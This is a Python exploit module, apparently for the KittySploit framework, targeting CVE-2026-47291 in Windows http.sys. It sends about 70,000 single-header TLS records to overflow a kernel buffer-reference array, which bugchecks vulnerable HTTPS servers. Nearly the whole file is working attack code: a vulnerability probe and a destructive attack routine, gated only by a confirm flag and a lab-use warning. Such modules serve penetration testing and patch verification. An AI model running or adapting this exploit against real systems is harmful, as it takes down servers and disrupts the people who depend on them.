#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-47291 — HTTP.sys HTTP/1.1-over-TLS buffer-reference-array integer overflow.

Each TLS record carrying one CRLF-terminated header line grows the per-request
buffer-reference array in http.sys. After ~65536 references the 16-bit capacity
wraps and triggers a NonPagedPool heap overflow (bugcheck / potential kernel RCE).

Reference:
https://www.zerodayinitiative.com/blog/2026/7/9/cve-2026-47291-remote-code-execution-in-the-windows-httpsys
"""

from __future__ import annotations

import socket
import ssl
import time
from typing import Optional, Tuple

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.target_utils import normalize_scanner_target


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Windows http.sys TLS buffer-ref overflow DoS (CVE-2026-47291)",
        "description": (
            "Streams HTTP/1.1 header lines one per TLS record over HTTPS to grow "
            "http.sys UlpReferenceBuffers until the 16-bit capacity wraps (~65536 "
            "references). Vulnerable pre-patch hosts bugcheck; patched hosts drop "
            "the connection cleanly. Requires MaxRequestBytes >= ~262144 on target."
        ),
        "author": ["w3bd3vil", "KittySploit Team"],
        "cve": ["CVE-2026-47291"],
        "platform": Platform.WINDOWS,
        "references": [
            "https://www.zerodayinitiative.com/blog/2026/7/9/cve-2026-47291-remote-code-execution-in-the-windows-httpsys",
        ],
        "tags": ["windows", "http.sys", "https", "tls", "dos", "kernel", "overflow"],
        "agent": {
            "risk": "intrusive",
            "effects": ["denial_of_service"],
            "expected_requests": 70000,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
        },
    }

    count = OptInteger(
        70000,
        "Single-header TLS records to stream in attack mode (wrap ~65536)",
        required=False,
    )
    probe_count = OptInteger(
        2000,
        "Single-header TLS records for check() probe",
        required=False,
        advanced=True,
    )
    pace = OptFloat(
        0.0015,
        "Seconds between header records in attack mode (~650 rec/s at default)",
        required=False,
        advanced=True,
    )
    confirm = OptBool(False, "Confirm intentional kernel DoS attempt", True)

    def _opt(self, option):
        if hasattr(option, "value"):
            return option.value
        if hasattr(option, "__get__"):
            try:
                return option.__get__(self, type(self))
            except Exception:
                pass
        return option

    def _to_bool(self, value) -> bool:
        if isinstance(value, bool):
            return value
        if isinstance(value, str):
            return value.lower() in ("true", "yes", "y", "1")
        return bool(value)

    def _resolve_target(self) -> Tuple[str, int, str, float, bool]:
        raw = str(self._opt(self.target) or "").strip()
        if not raw:
            return "", 0, "/", float(self._opt(self.timeout) or 30.0), True

        host, url_port, url_ssl = normalize_scanner_target(raw)
        if not host:
            host = raw

        port = int(url_port if url_port is not None else self._opt(self.port) or 443)
        if url_ssl is not None:
            ssl_enabled = url_ssl
        else:
            ssl_enabled = self._to_bool(self._opt(self.ssl))

        path = str(self._opt(self.path) or "/").strip() or "/"
        if not path.startswith("/"):
            path = "/" + path

        timeout = float(self._opt(self.timeout) or 30.0)
        return host, port, path, timeout, ssl_enabled

    @staticmethod
    def _build_ctx() -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            ctx.set_alpn_protocols(["http/1.1"])
        except NotImplementedError:
            pass
        return ctx

    def _connect(self, host: str, port: int, timeout: float) -> ssl.SSLSocket:
        raw = socket.create_connection((host, port), timeout=timeout)
        raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        ctx = self._build_ctx()
        sock = ctx.wrap_socket(raw, server_hostname=host)
        print_success(f"TLS established: {sock.version()} / cipher {sock.cipher()[0]}")
        ap = sock.selected_alpn_protocol()
        print_status(f"ALPN selected: {ap or '(none -> HTTP/1.1)'}")
        if ap == "h2":
            print_error("Server negotiated HTTP/2 — vulnerable path is HTTP/1.1 only.")
            sock.close()
            raise RuntimeError("HTTP/2 negotiated")
        return sock

    @staticmethod
    def _rec(sock: ssl.SSLSocket, data) -> None:
        sock.sendall(data if isinstance(data, bytes) else data.encode())

    def _probe(
        self,
        host: str,
        port: int,
        path: str,
        timeout: float,
        record_count: int,
    ) -> dict:
        sock: Optional[ssl.SSLSocket] = None
        try:
            sock = self._connect(host, port, timeout)
            self._rec(sock, f"GET {path} HTTP/1.1\r\n")
            self._rec(sock, f"Host: {host}\r\n")
            print_status(f"Probe: sending {record_count} single-header TLS records …")
            for i in range(record_count):
                self._rec(sock, b"X-P%x:1\r\n" % i)
            self._rec(sock, b"\r\n")
            sock.settimeout(timeout)
            try:
                resp = sock.recv(4096)
                line = resp.split(b"\r\n")[0].decode(errors="replace")
                return {
                    "ok": True,
                    "response_line": line,
                    "records_sent": record_count,
                    "reason": f"HTTP/1.1-over-TLS accepted {record_count} header records",
                }
            except socket.timeout:
                return {
                    "ok": False,
                    "records_sent": record_count,
                    "reason": "No HTTP response after probe (timeout)",
                }
        except (ssl.SSLError, socket.error, ConnectionError, OSError, RuntimeError) as exc:
            return {
                "ok": False,
                "records_sent": 0,
                "reason": str(exc),
            }
        finally:
            if sock is not None:
                try:
                    sock.close()
                except Exception:
                    pass

    def _attack(
        self,
        host: str,
        port: int,
        path: str,
        timeout: float,
        record_count: int,
        pace: float,
    ) -> dict:
        sock: Optional[ssl.SSLSocket] = None
        sent = 0
        t0 = time.time()
        try:
            sock = self._connect(host, port, timeout)
            self._rec(sock, f"GET {path} HTTP/1.1\r\n")
            self._rec(sock, f"Host: {host}\r\n")
            print_warning(
                f"Streaming up to {record_count} single-header TLS records "
                "(one CRLF-terminated header per record) …"
            )
            for i in range(record_count):
                self._rec(sock, b"X-P%x:1\r\n" % i)
                sent += 1
                if pace > 0:
                    time.sleep(pace)
                if sent % 5000 == 0:
                    dt = time.time() - t0
                    rate = sent / max(dt, 1e-9)
                    print_status(
                        f"  {sent:>7} records  ({rate:,.0f} rec/s, {dt:,.1f}s)  "
                        f"~capacity growths={sent // 5}"
                    )
            self._rec(sock, b"\r\n")
            sock.settimeout(timeout)
            resp = sock.recv(4096)
            line = resp.split(b"\r\n")[0].decode(errors="replace")
            return {
                "crash_boundary": False,
                "patched": True,
                "records_sent": sent,
                "response_line": line,
                "elapsed": time.time() - t0,
            }
        except (ssl.SSLError, socket.error, ConnectionError, OSError, RuntimeError) as exc:
            elapsed = time.time() - t0
            crash_boundary = sent >= 65000
            return {
                "crash_boundary": crash_boundary,
                "patched": False,
                "records_sent": sent,
                "error": repr(exc),
                "elapsed": elapsed,
            }
        finally:
            if sock is not None:
                try:
                    sock.close()
                except Exception:
                    pass

    def check(self):
        host, port, path, timeout, ssl_enabled = self._resolve_target()
        if not host:
            return {"vulnerable": False, "reason": "target not set", "confidence": "low"}
        if not ssl_enabled:
            return {
                "vulnerable": False,
                "reason": "HTTPS/TLS required (ssl must be true)",
                "confidence": "high",
            }

        probe_n = max(2, min(int(self._opt(self.probe_count) or 2000), 2000))
        result = self._probe(host, port, path, timeout, probe_n)
        if result.get("ok"):
            return {
                "vulnerable": True,
                "reason": result["reason"],
                "confidence": "medium",
                "response_line": result.get("response_line"),
                "records_sent": result.get("records_sent"),
            }
        return {
            "vulnerable": False,
            "reason": result.get("reason", "probe failed"),
            "confidence": "low",
            "records_sent": result.get("records_sent", 0),
        }

    def run(self) -> bool:
        host, port, path, timeout, ssl_enabled = self._resolve_target()
        if not host:
            print_error("Target is required")
            return False
        if not ssl_enabled:
            print_error("This module requires HTTPS/TLS (set ssl=true)")
            return False
        if not self._to_bool(self._opt(self.confirm)):
            print_error("Refusing kernel DoS without confirm=true")
            return False

        record_count = max(1, int(self._opt(self.count) or 70000))
        pace = max(0.0, float(self._opt(self.pace) or 0.0))

        print_warning(
            "CVE-2026-47291 attack is destructive on vulnerable targets "
            "(bugcheck / reboot). Authorized lab use only."
        )
        print_info(f"Target: https://{host}:{port}{path}")

        result = self._attack(host, port, path, timeout, record_count, pace)
        sent = int(result.get("records_sent") or 0)
        elapsed = float(result.get("elapsed") or 0.0)

        if result.get("patched"):
            print_success(
                f"Sent all {sent} records without crash; server replied: "
                f"{result.get('response_line', '')!r}"
            )
            print_status("No bugcheck — target is patched or not vulnerable.")
            return False

        print_error(f"Connection died after {sent} records ({elapsed:,.1f}s): {result.get('error')}")
        if result.get("crash_boundary"):
            print_success(
                "Died near the ~65536 wrap boundary — consistent with pool overflow "
                "(check target for bugcheck 0x139/0xCA/0x19)."
            )
            return True

        print_status("Died early — likely a server-side limit/timeout, not the overflow.")
        return False
